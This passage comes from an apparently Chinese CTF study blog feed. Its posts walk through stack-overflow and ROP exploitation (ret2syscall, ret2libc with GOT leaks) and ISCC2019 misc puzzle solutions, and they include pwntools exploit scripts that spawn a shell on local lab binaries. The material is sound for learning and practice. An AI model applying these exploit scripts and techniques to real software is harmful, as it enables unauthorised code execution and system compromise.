class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p>例题：jarvisOJ level1</p><h3 id="ret2syscall"><a href="#ret2syscall" class="headerlink" title="ret2syscall"></a>ret2syscall</h3><p>首先checksec</p><p><img alt="" data-src="/2019/05/18/PWN学习之基本ROP/10.JPG" class="lazyload"></p><p>开启NX，IDA查看程序</p><p><img alt="" data-src="/2019/05/18/PWN学习之基本ROP/11.JPG" class="lazyload"></p><p>没有系统函数和shellcode，但是依然有栈溢出，这时候可以利用系统调用。下面介绍几个相关知识：</p><p>执行系统调用的指令是 int 0x80</p><p>系统调用获取shell的函数是 execve(“/bin/sh”,NULL,NULL)</p><p>对应的寄存器的值（对于32位程序）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">系统调用号，即 eax 应该为 0xb</span><br><span class="line">第一个参数，即 ebx 应该指向 /bin/sh 的地址，其实执行 sh 的地址也可以。</span><br><span class="line">第二个参数，即 ecx 应该为 0</span><br><span class="line">第三个参数，即 edx 应该为 0</span><br></pre></td></tr></table></figure><p>给寄存器赋值要利用到pop，因此需要ROPgadget</p><p>查找可存储寄存器的代码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary rop  --only <span class="string">'pop|ret'</span> | grep <span class="string">'eax'</span></span><br></pre></td></tr></table></figure><p>查找字符串</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary rop --string <span class="string">"/bin/sh"</span></span><br></pre></td></tr></table></figure><p>查找有int 0x80的地址</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary rop  --only <span class="string">'int'</span></span><br></pre></td></tr></table></figure><p>还有一点需要注意的是:ret操作会执行一次pop并作为跳转地址</p><p>首先找eax</p><p><img alt="" data-src="/2019/05/18/PWN学习之基本ROP/12.JPG" class="lazyload"></p><p>选取如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x080bb196 : pop eax ; ret</span><br></pre></td></tr></table></figure><p>再找ebx</p><p><img alt="" data-src="/2019/05/18/PWN学习之基本ROP/13.JPG" class="lazyload"></p><p>选取如下，一举三得</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x0806eb90 : pop edx ; pop ecx ; pop ebx ; ret</span><br></pre></td></tr></table></figure><p>查找”/bin/sh”</p><p><img alt="" data-src="/2019/05/18/PWN学习之基本ROP/14.JPG" class="lazyload"></p><p>查找int 0x80</p><p><img alt="" data-src="/2019/05/18/PWN学习之基本ROP/15.JPG" class="lazyload"></p><p>编写脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">"./rop"</span>)</span><br><span class="line">pop_eax_ret = <span class="number">0x080bb196</span></span><br><span class="line">pop_edx_ecx_ebx_ret = <span class="number">0x0806eb90</span></span><br><span class="line">int_0x80 = <span class="number">0x08049421</span></span><br><span class="line">binsh = <span class="number">0x80be408</span></span><br><span class="line">payload = flat([<span class="string">'A'</span> * <span class="number">112</span>, pop_eax_ret, <span class="number">0xb</span>, pop_edx_ecx_ebx_ret, <span class="number">0</span>, <span class="number">0</span>, binsh, int_0x80])</span><br><span class="line"><span class="keyword">print</span> len(payload)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h3 id="ret2libc"><a href="#ret2libc" class="headerlink" title="ret2libc"></a>ret2libc</h3><h4 id="ret2libc1"><a href="#ret2libc1" class="headerlink" title="ret2libc1"></a>ret2libc1</h4><p>首先checksec</p><p><img alt="" data-src="/2019/05/18/PWN学习之基本ROP/21.JPG" class="lazyload"></p><p>32位程序，NX开启。IDA查看程序</p><p><img alt="" data-src="/2019/05/18/PWN学习之基本ROP/22.JPG" class="lazyload"></p><p>存在栈溢出漏洞，Get shell最直接的方法就是：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">改写程序返回地址为so库中system函数的地址，同时布置好栈，将参数“/bin/sh\x00”放在’返回地址往后两个单位内存地址’处即可</span><br></pre></td></tr></table></figure><p>查看system函数和”/bin/sh”的地址</p><p><img alt="" data-src="/2019/05/18/PWN学习之基本ROP/23.JPG" class="lazyload"></p><p>编写脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">"./ret2libc1"</span>)</span><br><span class="line">system_addr = <span class="number">0x08048460</span></span><br><span class="line">bin_sh = <span class="number">0x08048720</span></span><br><span class="line">payload = flat([<span class="number">112</span>*<span class="string">'a'</span>,system_addr,<span class="string">'aaaa'</span>,bin_sh])</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p>例题：jarvisOJ level2</p><h4 id="ret2libc2"><a href="#ret2libc2" class="headerlink" title="ret2libc2"></a>ret2libc2</h4><p>首先checksec</p><p><img alt="" data-src="/2019/05/18/PWN学习之基本ROP/16.JPG" class="lazyload"></p><p>32位程序，开启了NX。IDA查看程序</p><p><img alt="" data-src="/2019/05/18/PWN学习之基本ROP/17.JPG" class="lazyload"></p><p>有栈溢出，并且有system函数和gets函数，攻击思路：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">利用gets函数向.bss段中写入“/bin/sh”，再调用系统函数执行system(&quot;/bin/sh&quot;)</span><br></pre></td></tr></table></figure><p>gdb查看system函数和gets函数在plt表中的位置</p><p><img alt="" data-src="/2019/05/18/PWN学习之基本ROP/18.JPG" class="lazyload"></p><p>找一个buf来存储写入的”/bin/sh”</p><p><img alt="" data-src="/2019/05/18/PWN学习之基本ROP/19.JPG" class="lazyload"></p><p>再找一个gadget连接gets和buf2，即ebx</p><p><img alt="" data-src="/2019/05/18/PWN学习之基本ROP/20.JPG" class="lazyload"></p><p>编写脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">"./ret2libc2"</span>)</span><br><span class="line">get_addr = <span class="number">0x08048460</span></span><br><span class="line">system_addr = <span class="number">0x08048490</span></span><br><span class="line">buf2 = <span class="number">0x0804a080</span></span><br><span class="line">pop_ebx = <span class="number">0x0804843d</span></span><br><span class="line">payload = flat([<span class="number">112</span>*<span class="string">'a'</span>,get_addr,pop_ebx,buf2,system_addr,<span class="string">'aaaa'</span>,buf2])</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.sendline(<span class="string">"/bin/sh"</span>)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p>该方法同样适用于ret2libc1</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">"./ret2libc1"</span>)</span><br><span class="line">get_addr = <span class="number">0x08048430</span></span><br><span class="line">system_addr = <span class="number">0x08048460</span></span><br><span class="line">buf2 = <span class="number">0x0804a080</span></span><br><span class="line">pop_ebx = <span class="number">0x0804841d</span></span><br><span class="line">payload = flat([<span class="number">112</span>*<span class="string">'a'</span>,get_addr,pop_ebx,buf2,system_addr,<span class="string">'aaaa'</span>,buf2])</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.sendline(<span class="string">"cat flag &gt; 111"</span>)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h3 id="ret2libc3"><a href="#ret2libc3" class="headerlink" title="ret2libc3"></a>ret2libc3</h3><p>首先checksec</p><p><img alt="" data-src="/2019/05/18/PWN学习之基本ROP/24.JPG" class="lazyload"></p><p>32位程序，NX开启。IDA查看</p><p><img alt="" data-src="/2019/05/18/PWN学习之基本ROP/25.JPG" class="lazyload"></p><p>有栈溢出，无system函数。下面介绍两个知识点：</p><p>1、system 函数属于 libc，而 libc.so 动态链接库中的函数之间相对偏移是固定的，也就是说要找基地址。举个例子：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">puts真实地址-puts偏移地址 = system真实地址-system偏移地址 = 基地址</span><br></pre></td></tr></table></figure><p>2、那么如何得到 libc 中的某个函数的地址呢？我们一般常用的方法是采用 got 表泄露，即输出某个函数对应的 got 表项的内容。当然，由于 libc 的延迟绑定机制，我们需要泄漏已经执行过的函数的地址，已经执行过的话就会在got表生存下来。同时可以根据got表项找到对应的libc.so，从而确定函数偏移。举个例子：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">利用puts函数泄露puts函数的got表，因为puts函数在gets之前使用过。</span><br></pre></td></tr></table></figure><p>利用puts的got表项找对应的libc.so有两种方法：</p><p>1、<a href="https://libc.blukat.me" target="_blank" rel="noopener">https://libc.blukat.me</a></p><p>2、<a href="https://github.com/lieanu/LibcSearcher" target="_blank" rel="noopener">https://github.com/lieanu/LibcSearcher</a></p><p>objdump看一下got表有哪些</p><p><img alt="" data-src="/2019/05/18/PWN学习之基本ROP/26.JPG" class="lazyload"></p><p>因为PIE是关闭的，所以可以直接去puts出got表中puts的内容，并且返回到面函数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line">p=process(<span class="string">'./ret2libc3'</span>)</span><br><span class="line"><span class="keyword">if</span> args.G:</span><br><span class="line">    gdb.attach(p)</span><br><span class="line">elf = ELF(<span class="string">"./ret2libc3"</span>)</span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">112</span> + p32(elf.plt[<span class="string">'puts'</span>]) + p32(elf.symbols[<span class="string">'main'</span>]) + p32(elf.got[<span class="string">'puts'</span>])</span><br><span class="line">p.sendlineafter(<span class="string">'!?'</span>,payload)</span><br><span class="line">puts_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line"><span class="keyword">print</span> hex(puts_addr)</span><br></pre></td></tr></table></figure><p>然后根据got表中puts的内容找到相应的libc</p><p><img alt="" data-src="/2019/05/18/PWN学习之基本ROP/27.JPG" class="lazyload"></p><p>这样就可以求出libc的基地址，system的地址和“/bin/sh”的地址</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">libc_base = puts_addr - libc.symbols[<span class="string">'puts'</span>]</span><br><span class="line">system_addr = libc_base + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">binsh_addr = next(libc.search(<span class="string">"/bin/sh"</span>))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">112</span> + p32(system_addr) + p32(elf.symbols[<span class="string">'main'</span>]) + p32(binsh_addr)</span><br><span class="line">p.sendlineafter(<span class="string">'!?'</span>,payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>但是这样有个小问题，第二次调用main函数的时候，esp和ebp的相对偏移发生了变化，payload应为</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">'a'</span>*<span class="number">112</span> + p32(system_addr) + p32(elf.symbols[<span class="string">'main'</span>]) + p32(binsh_addr)</span><br></pre></td></tr></table></figure><p>利用cyclic来判断</p><p><img alt="" data-src="/2019/05/18/PWN学习之基本ROP/28.JPG" class="lazyload"></p><p>于是编写脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> LibcSearcher</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">"./ret2libc3"</span>)</span><br><span class="line">ret2libc3 = ELF(<span class="string">"./ret2libc3"</span>)</span><br><span class="line"></span><br><span class="line">puts_plt = ret2libc3.plt[<span class="string">'puts'</span>]</span><br><span class="line">puts_got = ret2libc3.got[<span class="string">'puts'</span>]</span><br><span class="line">main = ret2libc3.symbols[<span class="string">'main'</span>]</span><br><span class="line"></span><br><span class="line">payload = flat([<span class="number">112</span>*<span class="string">'a'</span>,puts_plt,main,puts_got])</span><br><span class="line">sh.sendlineafter(<span class="string">"Can you find it !?"</span>,payload)</span><br><span class="line">puts_addr = u32(sh.recv(<span class="number">4</span>))</span><br><span class="line"><span class="keyword">print</span> hex(puts_addr)</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">'puts'</span>,puts_addr)</span><br><span class="line">libcbase = puts_addr - libc.dump(<span class="string">'puts'</span>)</span><br><span class="line">system_addr = libcbase + libc.dump(<span class="string">'system'</span>)</span><br><span class="line">binsh_addr = libcbase + libc.dump(<span class="string">'str_bin_sh'</span>)</span><br><span class="line"></span><br><span class="line">payload = flat([<span class="number">104</span>*<span class="string">'a'</span>,system_addr,<span class="string">'aaaa'</span>,binsh_addr])</span><br><span class="line">sh.sendlineafter(<span class="string">"Can you find it !?"</span>,payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> pwn学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>PWN学习之栈溢出</title>
      <link href="/2019/05/17/PWN%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%A0%88%E6%BA%A2%E5%87%BA/"/>
      <url>/2019/05/17/PWN%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%A0%88%E6%BA%A2%E5%87%BA/</url>
      
        <content type="html"><![CDATA[<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">learning without thought is vain， thought without learning is idle!</span><br></pre></td></tr></table></figure><p>不知道为什么，突然就领悟了这句早已滚瓜烂熟的孔夫子的经典名言–“学而不思则罔，思而不学则殆”。作为理工科来说，工而不理则罔，理而不工则殆。对于PWN的学习亦是如此，不动手只会越来越不想动手，而一动手就是一堆错。到头来只能感叹：“道理我都懂，可它就是不对！”为此，特将学习PWN的过程一一记录，以防思而不学。</p><p>理论参考CTFwiki，这里只记录过程</p><p>源代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">success</span><span class="params">()</span> </span></span><br><span class="line"><span class="function"></span>&#123; </span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"You Hava already controlled it."</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">vulnerable</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s[<span class="number">12</span>];</span><br><span class="line">  gets(s);</span><br><span class="line">  <span class="built_in">puts</span>(s);</span><br><span class="line">  <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  vulnerable();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译前提</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">root@kali:/pwn/栈溢出<span class="comment"># cat /proc/sys/kernel/randomize_va_space  ##关闭ASLR</span></span><br><span class="line">2</span><br><span class="line">root@kali:/pwn/栈溢出<span class="comment"># echo 0 -&gt; /proc/sys/kernel/randomize_va_space </span></span><br><span class="line">root@kali:/pwn/栈溢出<span class="comment"># cat /proc/sys/kernel/randomize_va_space </span></span><br><span class="line">0</span><br><span class="line">root@kali:pwn/栈溢出<span class="comment"># apt install gcc-multilib  #完善gcc环境，使之能生成32位程序</span></span><br></pre></td></tr></table></figure><p>进行编译</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">gcc -m32 -fno-stack-protector -no-pie stack_example.c -o stack_example</span><br><span class="line">stack_example.c: In <span class="keyword">function</span> ‘vulnerable’:</span><br><span class="line">stack_example.c:9:3: warning: implicit declaration of <span class="keyword">function</span> ‘gets’; did you mean ‘fgets’? [-Wimplicit-function-declaration]</span><br><span class="line">   gets(s);</span><br><span class="line">   ^~~~</span><br><span class="line">   fgets</span><br><span class="line">/usr/bin/ld: /tmp/ccVDCXWz.o: <span class="keyword">in</span> <span class="keyword">function</span> `vulnerable<span class="string">':</span></span><br><span class="line"><span class="string">stack_example.c:(.text+0x45): 警告：the `gets'</span> <span class="keyword">function</span> is dangerous and should not be used.</span><br></pre></td></tr></table></figure><p>查看保护</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">checksec stack_example</span><br><span class="line">[*] <span class="string">'/mnt/hgfs/shared/pwn/\xe6\xa0\x88\xe6\xba\xa2\xe5\x87\xba/stack_example'</span></span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure><p>IDA查看</p><p><img alt="" data-src="/2019/05/17/PWN学习之栈溢出/1.JPG" class="lazyload"></p><p>IDA获取success地址</p><p><img alt="" data-src="/2019/05/17/PWN学习之栈溢出/2.JPG" class="lazyload"></p><p>攻击脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">##coding=utf8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">## 构造与程序交互的对象</span></span><br><span class="line">sh = process(<span class="string">'./stack_example'</span>)</span><br><span class="line">success_addr = <span class="number">0x08049172</span></span><br><span class="line"><span class="comment">## 构造payload</span></span><br><span class="line">payload = <span class="string">'a'</span> * <span class="number">0x14</span> + <span class="string">'bbbb'</span> + p32(success_addr)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"addr:"</span></span><br><span class="line"><span class="keyword">print</span> p32(success_addr)</span><br><span class="line"><span class="comment">## 向程序发送字符串</span></span><br><span class="line">sh.sendline(payload)</span><br><span class="line"><span class="comment">## 将代码交互转换为手工交互</span></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p>结果如下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">root@kali:shared/pwn/栈溢出<span class="comment"># python exp.py </span></span><br><span class="line">[+] Starting <span class="built_in">local</span> process <span class="string">'./stack_example'</span>: pid 8314</span><br><span class="line">addr:</span><br><span class="line">r\x91\x0</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">[*] Process <span class="string">'./stack_example'</span> stopped with <span class="built_in">exit</span> code -11 (SIGSEGV) (pid 8314)</span><br><span class="line">aaaaaaaaaaaaaaaaaaaabbbbr\x91\x0</span><br><span class="line">You Hava already controlled it.</span><br><span class="line">[*] Got EOF <span class="keyword">while</span> reading <span class="keyword">in</span> interactive</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> pwn学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>ISCC2019解题记录</title>
      <link href="/2019/05/05/ISCC2019%E8%A7%A3%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
      <url>/2019/05/05/ISCC2019%E8%A7%A3%E9%A2%98%E8%AE%B0%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<h3 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h3><h4 id="隐藏的信息"><a href="#隐藏的信息" class="headerlink" title="隐藏的信息"></a>隐藏的信息</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tip：这是一个被混淆的文件，但是我忘记了这个文件的密码。你能够帮助我还原明文吗？</span><br></pre></td></tr></table></figure><p>很明显的八进制，先转成字符串，发现是base64编码，解码即可得到flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">filename = <span class="string">"message.txt"</span></span><br><span class="line"><span class="keyword">with</span> open(filename) <span class="keyword">as</span> f:</span><br><span class="line">txt = f.read().split(<span class="string">" "</span>)</span><br><span class="line"> </span><br><span class="line"><span class="comment">#print txt</span></span><br><span class="line">s = <span class="string">""</span>   </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> txt:</span><br><span class="line"><span class="keyword">if</span> i:</span><br><span class="line">    s += chr(int(i,<span class="number">8</span>))</span><br><span class="line">flag = base64.b64decode(s)</span><br><span class="line"><span class="keyword">print</span> flag</span><br></pre></td></tr></table></figure><p>flag:ISCC{N0_0ne_can_st0p_y0u}</p><p>知识点：八进制、base64</p><h4 id="倒立屋"><a href="#倒立屋" class="headerlink" title="倒立屋"></a>倒立屋</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tip：房屋为什么会倒立！是重力反转了吗？</span><br></pre></td></tr></table></figure><p>用stegsolve打开，DataExtract分析,发现IsCc_2019，直接提交不对，根据提示倒过来就对了</p><p><img alt="" data-src="/2019/05/05/ISCC2019解题记录/1.JPG" class="lazyload"></p><p>Save Bin，将前9个字节进行逆序</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">filename = <span class="string">"2"</span></span><br><span class="line"><span class="keyword">with</span> open(filename,<span class="string">"rb"</span>) <span class="keyword">as</span> f:</span><br><span class="line">s = f.read()</span><br><span class="line"></span><br><span class="line">s = s[:<span class="number">9</span>]</span><br><span class="line">flag = s[::<span class="number">-1</span>]</span><br><span class="line"><span class="keyword">print</span> flag</span><br></pre></td></tr></table></figure><p>flag：9102_cCsI</p><p>知识点：LSB隐写</p><h4 id="Keyes’-secret"><a href="#Keyes’-secret" class="headerlink" title="Keyes’ secret"></a>Keyes’ secret</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tip：Trying to figure out Keyes&apos; secret</span><br></pre></td></tr></table></figure><p>打开文件发现都是大写英文字母，有点像键盘密码，于是进行替换</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">RFVGYHN -&gt; h</span><br><span class="line">WSXCDE -&gt; e</span><br><span class="line">WSXCV -&gt; l</span><br><span class="line">TGBNMJUY - o</span><br></pre></td></tr></table></figure><p>得到hello，说明想法是对的，最后得到一段话，flag要转为大写</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hello,in computer security, capture the flag (ctf), a type of cryptosport, is a computer security competition. ctf contests are usually desluned to serve as an educational exercise to give participants experience in securing a machine, as well as conducting and reacting to the sort of attacks found in the real world (i.e., bug bounty programs in professional settings). here are your FLAG&#123;ISCC KEYBOARD CIPHER&#125; reverse-engineering, network sniffing, protocol analysis, system administration, programming, and cryptanalysis are all skills which have been required by prior ctf contests at def con.</span><br></pre></td></tr></table></figure><p>flag：FLAG{ISCC KEYBOARD CIPHER}</p><p>知识点：键盘密码</p><h4 id="Aesop’s-secret"><a href="#Aesop’s-secret" class="headerlink" title="Aesop’s secret"></a>Aesop’s secret</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tip：Aesop&apos;s chest and key lie within. To find it.</span><br></pre></td></tr></table></figure><p>打开是一张GIF，分解后发现ISCC字样</p><p><img alt="" data-src="/2019/05/05/ISCC2019解题记录/2.JPG" class="lazyload"></p><p>用HxD查看GIF，在文件尾部发现base64编码字符串。先用base64解密发现<code>Salted__</code>，根据提示Aesop猜测与AES加密有关，关键词搜索发现这是crypto-js中AES加密（<a href="https://stackoverflow.com/questions/36762098/how-to-decrypt-password-from-javascript-cryptojs-aes-encryptpassword-passphras），借用网上的脚本，双重解密后得到flag" target="_blank" rel="noopener">https://stackoverflow.com/questions/36762098/how-to-decrypt-password-from-javascript-cryptojs-aes-encryptpassword-passphras），借用网上的脚本，双重解密后得到flag</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span 